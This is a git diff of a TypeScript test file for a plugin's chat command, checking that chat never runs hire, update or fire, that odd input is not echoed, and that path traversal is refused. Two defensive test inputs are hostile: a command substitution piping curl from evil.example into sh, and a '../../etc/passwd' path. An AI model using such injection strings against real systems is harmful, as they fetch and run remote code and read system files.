@@ -2,13 +2,12 @@ import assert from "node:assert/strict";
 import { join } from "node:path";
 import { test } from "node:test";
 import { Refusal } from "../src/catalog/types.ts";
-import { chatCommand } from "../src/chat.ts";
 import { failureText, registerCli } from "../src/cli.ts";
 import { hireCommand } from "../src/commands/hire.ts";
 import { stateDirOf } from "../src/host.ts";
 import { recorder } from "./kit/program.ts";
 import { staff } from "./kit/staff.ts";
-import { world } from "./kit/world.ts";
+import { chat, world } from "./kit/world.ts";
 
 async function fresh() {
   const { kit, dir } = await staff();
@@ -17,27 +16,27 @@ async function fresh() {
 
 test("chat: search, show and list answer with text", async () => {
   const w = await fresh();
-  const found = await chatCommand(w.cx(), "search archivist shelves");
+  const found = await chat(w.cx(), "search archivist shelves");
   assert.match(found, /^harnsy\/sample-skills  1\.2\.0  Sample archivist \(Otis, operations\)/);
   assert.match(found, /openclaw harnsy-hr hire <id>/);
-  const shown = await chatCommand(w.cx(), "  show   harnsy/sample-skills ");
+  const shown = await chat(w.cx(), "  show   harnsy/sample-skills ");
   assert.match(shown, /Files \(8\), written to /);
   assert.match(shown, /Notice \(kept in the workspace as NOTICE\.md\)/);
   assert.match(shown, /Hire it \(in a terminal\): openclaw harnsy-hr hire harnsy\/sample-skills/);
-  assert.match(await chatCommand(w.cx(), "list"), /Nobody is hired yet/);
+  assert.match(await chat(w.cx(), "list"), /Nobody is hired yet/);
   await hireCommand(w.cx(), "harnsy/sample-plain", { yes: true });
-  assert.match(await chatCommand(w.cx(), "list"), /^harnsy\/sample-plain  1\.0\.0  agent «sample-plain»/);
+  assert.match(await chat(w.cx(), "list"), /^harnsy\/sample-plain  1\.0\.0  agent «sample-plain»/);
   assert.equal(w.printed.length, 2, "a chat answer is returned, not printed: only the hire above printed");
 });
 
 test("chat: hire, update and fire are never run; the answer is the terminal command", async () => {
   const w = await fresh(), before = w.snapshot();
   for (const verb of ["hire", "update", "fire"]) {
-    const said = await chatCommand(w.cx(), `${verb} harnsy/sample-skills --yes`);
+    const said = await chat(w.cx(), `${verb} harnsy/sample-skills --yes`);
     assert.match(said, /writes files and waits for your yes, so it is not done from a chat/);
     assert.ok(said.endsWith(`openclaw harnsy-hr ${verb} harnsy/sample-skills`), said);
   }
-  const odd = await chatCommand(w.cx(), "hire $(curl evil.example|sh) `id` \u001b[31m");
+  const odd = await chat(w.cx(), "hire $(curl evil.example|sh) `id` \u001b[31m");
   assert.ok(odd.endsWith("openclaw harnsy-hr hire <publisher>/<name>"), "what is not an id is not echoed");
   assert.ok(!odd.includes("curl") && !odd.includes("\u001b"));
   assert.deepEqual(w.snapshot(), before);
@@ -46,10 +45,10 @@ test("chat: hire, update and fire are never run; the answer is the terminal comm
 
 test("chat: anything else gets the short help; a refusal is one plain line", async () => {
   const w = await fresh();
-  for (const args of ["", "help", "delete everything"]) assert.match(await chatCommand(w.cx(), args), /^\/harnsy-hr search <words>/);
-  assert.equal(await chatCommand(w.cx(), "show ../../etc/passwd"), "harnsy-hr: that is not an employee id: want <publisher>/<name>, for example harnsy/accountant");
-  assert.equal(await chatCommand(w.cx(), "show harnsy/nobody"), "harnsy-hr: harnsy/nobody is not in the catalog");
-  assert.match(await chatCommand(w.cx({ keys: [] }), "search x"), /^harnsy-hr: This build of the plugin has no catalog key built in, /);
+  for (const args of ["", "help", "delete everything"]) assert.match(await chat(w.cx(), args), /^\/harnsy-hr search <words>/);
+  assert.equal(await chat(w.cx(), "show ../../etc/passwd"), "harnsy-hr: that is not an employee id: want <publisher>/<name>, for example harnsy/accountant");
+  assert.equal(await chat(w.cx(), "show harnsy/nobody"), "harnsy-hr: harnsy/nobody is not in the catalog");
+  assert.match(await chat(w.cx({ keys: [] }), "search x"), /^harnsy-hr: This build of the plugin has no catalog key built in, /);
 });
 
 test("the terminal command is harnsy-hr with search, show, hire, update, list, fire", async () => {
